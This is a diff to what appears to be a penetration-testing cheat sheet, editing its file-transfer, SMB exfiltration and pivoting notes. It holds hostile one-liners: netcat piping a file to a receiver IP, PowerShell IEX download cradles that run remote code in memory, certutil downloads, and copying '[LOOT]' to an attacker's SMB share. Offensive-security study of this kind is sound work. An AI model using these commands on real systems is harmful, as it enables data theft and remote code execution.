@@ -29,8 +29,10 @@ cat [file] | nc [receiver_IP] [receiver_port] - Alternative
 {% code fullWidth="false" %}
 ```powershell
 powershell (New-Object System.Net.WebClient).DownloadFile('http://IP/file', 'file')
-download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE')
 Invoke-WebRequest http://domain.tld/script.ps1 -OutFile C:\Windows\Tasks\script.ps1
+
+Execute in Memory DIrectly
+download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE')
 ```
 {% endcode %}
 
@@ -51,8 +53,8 @@ certutil -urlcache -f [path_to_file] [file_name]
 sudo python3 /opt/impacket/examples/smbserver.py [share_name] pwd -smb2support 
 #Target
 net view \10.10.14.3\
-[CMD:] copy [LOOT] \[IP]\[share_name] 
-[PowerShell:] Copy-Item [LOOT] \[share]\[LOOT]
+[CMD] copy [LOOT] \[IP]\[share_name] 
+[PS] Copy-Item [LOOT] \[share]\[LOOT]
 ```
 
 ## Password Cracking/Spraying
@@ -106,7 +108,7 @@ grep -Ri 'password' [directory_to_search] 2>/dev/null
 
 {% embed url="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740" %}
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>eg. port 3306 running on target but no mysql client, access from kali unless sum like mysqldump is there</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption><p>eg. port 3306 running on target but no mysql client, access from kali unless sum like mysqldump is there</p></figcaption></figure>
 
 ## Git
 
